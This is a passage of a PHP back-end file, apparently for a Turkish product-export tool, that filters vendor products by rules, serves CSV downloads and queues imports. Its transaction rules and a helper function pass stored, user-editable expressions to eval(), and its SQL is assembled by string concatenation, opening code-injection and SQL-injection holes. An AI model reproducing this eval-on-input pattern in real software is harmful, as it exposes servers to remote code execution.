                $leftJoinSelectFields[] = "MAX(IF(attribute_id = $pAttr->Id, value_, '')) AS prod_$pAttr->Name";
            else
                $leftJoinSelectFields[] = "MAX(IF(attribute_id = $pAttr->Id, value_, '')) AS $pAttr->Name";
        }
        if ($pAttr->IsVendor && $pAttr->Important)
            $selectFields[] = "IF(T1.$pAttr->Name IS NOT NULL, T1.$pAttr->Name, T3.prod_$pAttr->Name) AS $pAttr->Name";
        else if($pAttr->IsVendor)
            $selectFields[] = "T1.$pAttr->Name";
        else if(! $pAttr->IsVendor)
            $selectFields[] = "T3.$pAttr->Name";
    }

    $sorgu = "
            SELECT
                T1.id AS pms_id,".implode(',',$selectFields)."
            FROM vendor_products T1
            INNER JOIN vendors T2 ON T1.vendor_id=T2.id
            LEFT JOIN (
                SELECT 
                product_id AS prod_key,
                ".implode(',',$leftJoinSelectFields)."
                FROM product_attributes
                GROUP BY product_id
            ) AS T3 ON T1.`product_id`=T3.prod_key
        ";
    $vendorProducts = DB::FetchObject($sorgu);
    $summary->Total = count($vendorProducts);

    foreach ($vExport->RulesInfo as $rule)
    {
        $summary->Before = count($vendorProducts);
        foreach ($vendorProducts as $productKey => $product)
        {
            $productCond = null;
            $isAnd = false;
            foreach ($rule->FiltersInfo as $filter)
            {
                if($filter->Operator == "IF")
                    $isAnd = true;
                if(! $isAnd)
                    continue;

                if($filter->Operator == "OR" && $productCond === true)
                    continue;

                if($filter->Operator == "IF" && $productCond === false)
                    continue;

                $filterSart = false;
                //If selected All
                if($filter->PAttributeId == -2)
                    $filterSart = true;
                else if($filter->ConditionRule == 1)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} == $filter->Value)
                    {
                        $filterSart = true;
                    }
                }
                else if($filter->ConditionRule == 2)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} != $filter->Value)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }
                else if($filter->ConditionRule == 3)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} > $filter->Value)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }
                else if($filter->ConditionRule == 4)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} >= $filter->Value)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }
                else if($filter->ConditionRule == 5)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} < $filter->Value)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }
                else if($filter->ConditionRule == 6)
                {
                    if($product->{$attrValues[$filter->PAttributeId]} <= $filter->Value)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }
                else if($filter->ConditionRule == 7)
                {
                    //                        if(! str_contains($filter->Value,$product->{$attrValues[$filter->PAttributeId]}))
                    if(strpos($product->{$attrValues[$filter->PAttributeId]}, $filter->Value) !== false)
                    {
                        if($productCond === null)
                            $productCond = true;
                        else
                        {
                            if($filter->Operator == "IF")
                                $productCond = $productCond && true;
                            else
                                $productCond = $productCond || true;
                        }
//                            unset($filteredVendorProducts[$productKey]);
                        continue;
                    }
                }

                if($productCond === null)
                    $productCond = $filterSart;
                else
                {
                    if($filter->Operator == "IF")
                        $productCond = $productCond && $filterSart;
                    else
                        $productCond = $productCond || $filterSart;
                }
            }

            if($productCond === true)
            {
                if($rule->Transaction == 1)
                    unset($vendorProducts[$productKey]);
                else
                {
                    foreach ($rule->TransactionsInfo as $transaction)
                    {
                        if($transaction->ConditionRule == 1)
                        {
                            $vendorProducts[$productKey]->{$attrValues[$transaction->PAttributeId]} = $transaction->Value;
                        }
                        else if($transaction->ConditionRule == 2)
                        {
                            $expression = $transaction->Value;
                            $rep["'"]  = '&#39;';
                            $rep['"']  = '&quot;';
                            $expression = str_replace(
                                array_values($rep),
                                array_keys($rep),
                                $expression);
                            $expression = str_replace(",", ".", $expression);
                            $expression = str_replace(";", ",", $expression);
                            preg_match_all('/{{(.*?)}}/', $expression, $matches);

                            foreach ($matches[1] as $var)
                            {
                                if (property_exists($vendorProducts[$productKey], $var))
                                {
                                    // String içindeki {{var}} kısmını objenin ilgili değeri ile değiştir
                                    $expression = str_replace('{{' . $var . '}}', $vendorProducts[$productKey]->$var, $expression);
                                }
                            }
                            $expression = '$result = ' . $expression . ';';

                            // Geçici hata işleyici fonksiyonu

                            try {
                                eval('try { ' . $expression . ' } catch (Exception $e) { echo "Exception: " . $e->getMessage(); }');
                                eval($expression);
                                if(isset($result))
                                    $vendorProducts[$productKey]->{$attrValues[$transaction->PAttributeId]} = $result;
                            } catch (Throwable $e) {
                                // Hata mesajını döndür
                                //echo "Hata: " . $e->getMessage() . "\n";
                            }
                        }
                    }
                }
            }
        }
        $summary->After = count($vendorProducts);
        if($rule->Id == $lastRuleId)
            break;
    }

    if($returnSummary)
        return $summary;
    return $vendorProducts;
}

function isValidPhpCode($code)
{
    $valid = false;

    try {
        echo $code;
        eval('try { ' . $code . ' } catch (Exception $e) { echo "Exception: " . $e->getMessage(); }');
        $valid = true;
    } catch (Throwable $e) {
        // Hata mesajını döndür
        //echo "Hata: " . $e->getMessage() . "\n";
    }

    return $valid;
}
function DownloadVExportCsv()
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $id = DgrCode::Decode($_GET["vexport"]);
    if($id != "")
    {
        $vExport = VendorExportDb::Get()->GetById($id);
        if(! $vExport)
            die("Hatalı link");

        if($vExport->FilePath == "")
        {
            VExportCsv($vExport->Id);
            $vExport = VendorExportDb::Get()->GetById($id);
        }

        if($vExport->FilePath != "")
        {
            $arr = explode("/",$vExport->FilePath);
            $fName = $arr[count($arr) - 1];

            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="'.$fName.'"');
            header('Content-Length: ' . filesize($vExport->FilePath));

            readfile($vExport->FilePath);
        }
        exit;

    }

}
function AddWorkImport($importId)
{
    $import = ImportDb::Get()->GetById($importId);
    if($import && ($import->FromAt == Import::Ftp || $import->FromAt == Import::Url))
    {
        /*if($import->ImportType == Import::Feed && $import->SpKey == "")
            return "Eksik parametre var";*/
        $workImport = new WorkImport();
        $workImport->ImportId = $import->Id;
        $workImport->AddedDate = Tarih::Simdi();
        $snc = $workImport->Save();
        if(isLocalhost())
            RunWorkImport();
        return $snc;
    }
    return "Import not found";
}
function RunWorkImport()
{
    $param = WorkImport::AsParams();
    $param->ImportLogId = Condition::GT(0);
    $workImport = WorkImportDb::Get()->GetFirst($param);
    if($workImport)
    {
        $importLog = ImportLogDb::Get()->GetById($workImport->ImportLogId);
        $workTime = Tarih::FarkVer($importLog->StartedTime,Tarih::Simdi(),"DAKIKA");
        if($importLog && ! $importLog->FinishedTime && $workTime < 20)
            return "Devam eden import işlemi bulunmaktadır." . Tarih::FarkVer($importLog->StartedTime,Tarih::Simdi(),"DAKIKA");
        $workImport->Delete();
    }
    $workImport = WorkImportDb::Get()->SetOrderByExp("id ASC")->GetFirst();
    if(! $workImport)
        return "Bekleyen import yok";
    $import = ImportDb::Get()->GetById($workImport->ImportId);
    if(! $import)
    {
        $workImport->Delete();
        return "Çalışacak import bulunamadı.";
    }

    $importLog = new ImportLog();
    $importLog->ImportId = $import->Id;
    $importLog->StartedTime = $importLog->CreatedTime = Tarih::Simdi();
    $importLog->UserId = KisiId();
    $importLog->Save();

    $workImport->ImportLogId = $importLog->Id;
    if($workImport->Save())
    {
        if($import->FromAt == Import::Ftp)
            return RunImportFtp($import, $importLog);
        else if($import->FromAt == Import::Url)
            return RunImportUrl($import, $importLog);
        else
            return "Hatalı işlem";
    }
}

function SortRules($exportId)
{

}
